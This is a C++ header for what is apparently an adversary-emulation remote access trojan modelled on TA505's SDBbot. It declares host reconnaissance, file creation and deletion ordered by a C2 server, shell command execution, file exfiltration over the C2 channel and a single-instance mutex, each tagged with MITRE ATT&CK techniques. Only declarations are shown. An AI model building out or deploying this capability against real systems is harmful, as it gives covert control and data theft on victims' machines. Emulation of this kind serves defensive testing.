#include "net.hpp"
#include "settings.hpp"
#include "json.hpp"
#include "base64.hpp"
#include "xor_logger.hpp"
#include <string>
#include <Lmcons.h>
#include <fstream>
#include <iostream>
#include <filesystem>

typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

// All recon functionality used by the RAT
namespace Recon {

    // recon performed against the local system
    namespace LocalSystem {

        //  GetCountryCode()
        //      About:
        //         Gets the local systems two letter country code
        //      Result:
        //         returns the country code as a string
        //      Returns:
        //         [std::string]
        //      MITRE ATT&CK Techniques:
        //         T1106 NATIVE API
        //         T1082 System Information Discovery
        //      CTI:
        //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
        //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
        std::string GetCountryCode();

        //  GetSystemDomainName()
        //      About:
        //         Gets the local systems associated domain name/workgroup
        //      Result:
        //         returns the system domain name/workgroup as a string
        //      Returns:
        //         [std::string]
        //      MITRE ATT&CK Techniques:
        //         T1106 NATIVE API
        //         T1082 System Information Discovery
        //      CTI:
        //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
        //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
        std::string GetSystemDomainName();

        //  GetSystemComputerName()
        //      About:
        //         Gets the local system name
        //      Result:
        //         returns the system name as a string
        //      Returns:
        //         [std::string]
        //      MITRE ATT&CK Techniques:
        //         T1106 NATIVE API
        //         T1082 System Information Discovery
        //      CTI:
        //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
        //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
        std::string GetSystemComputerName();

        //  GetWindowsVersion()
        //      About:
        //         Gets the local system windows version
        //      Result:
        //         formats the version info and returns it as a string
        //      Returns:
        //         [std::string]
        //      MITRE ATT&CK Techniques:
        //         T1106 NATIVE API
        //         T1082 System Information Discovery
        //      CTI:
        //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
        //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
        std::string GetWindowsVersion();

        //  IsProcessAdmin()
        //      About:
        //         Checks if the current process integrity is admin or user
        //      Result:
        //         returns a bool of true/false if the process is high integrity
        //      Returns:
        //         [bool]
        //      MITRE ATT&CK Techniques:
        //         T1106 NATIVE API
        //         T1082 System Information Discovery
        //         T1057 Process Discovery
        //      CTI:
        //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
        //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
        BOOL IsProcessAdmin();

        //  GetSystemUsername()
        //      About:
        //         Gets the current user's username
        //      Result:
        //         returns the username as a string
        //      Returns:
        //         [std::string]
        //      MITRE ATT&CK Techniques:
        //         T1106 NATIVE API
        //         T1033 System Owner/User Discovery
        //      CTI:
        //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
        //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
        std::string GetSystemUsername();

    }

    //  InitRecon()
    //      About:
    //         Initializes the recon checks
    //      Result:
    //         Creates json object with recon data
    //      Returns:
    //         [std::string]
    //      MITRE ATT&CK Techniques:
    //         T1106 NATIVE API
    //         T1082 System Information Discovery
    //         T1057 Process Discovery
    //      CTI:
    //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
    //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
    std::string InitRecon();
}

namespace Commands {

    //  cmdCreateFile(std::string filePath, std::string fileContents)
    //      About:
    //         Create a file on disk based on inforamtion provided from c2
    //      Result:
    //         A file is written to disk
    //      Returns:
    //         [int]
    //      MITRE ATT&CK Techniques:
    //         T1105 Ingress Tool Transfer
    //      CTI:
    //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
    //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
    int cmdCreateFile(std::string filePath, std::string fileContents);

    //  cmdDeleteFile(std::string filePath)
    //      About:
    //         Deletes a file from disk based on the file path provided from C2
    //      Result:
    //         A file is deleted from disk
    //      Returns:
    //         [int]
    //      MITRE ATT&CK Techniques:
    //         T1070 Indicator Removal
    //      CTI:
    //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
    //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
    int cmdDeleteFile(std::string filePath);

    //  cmdExecuteCommand(std::string command)
    //      About:
    //         Executes a commands from a subprocess and returns the response
    //      Result:
    //         runs a given commands and returns the response to the c2 server
    //      Returns:
    //         [std::string]
    //      MITRE ATT&CK Techniques:
    //         T1059.003 Command and Scripting Interpreter: Windows Command Shell
    //      CTI:
    //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
    //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
    std::string cmdExecuteCommand(std::string command);

    //  cmdUploadFile(std::string filePath)
    //      About:
    //         Opens and base64 encodes contents of a file on disk to be sent off to the c2 server
    //      Result:
    //         A file is sent to the c2 server
    //      Returns:
    //         [std::string]
    //      MITRE ATT&CK Techniques:
    //         T1041 Exfiltration Over C2 Channel
    //      CTI:
    //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
    //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
    std::string cmdUploadFile(std::string filePath);
}

// execution guardrails
namespace Guardrails {

    //  CheckCreateMutex()
    //      About:
    //         Checks if a mutex exists by a specific name. if it does, the application closes to prevent duplicates. If the mutex does not exist, it is created.
    //      Result:
    //         Application closes or creates a mutex
    //      Returns:
    //         [NULL]
    //      MITRE ATT&CK Techniques:
    //         T1480 Execution Guardrails
    //      CTI:
    //         https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
    //         https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
    BOOL CheckCreateMutex();
}

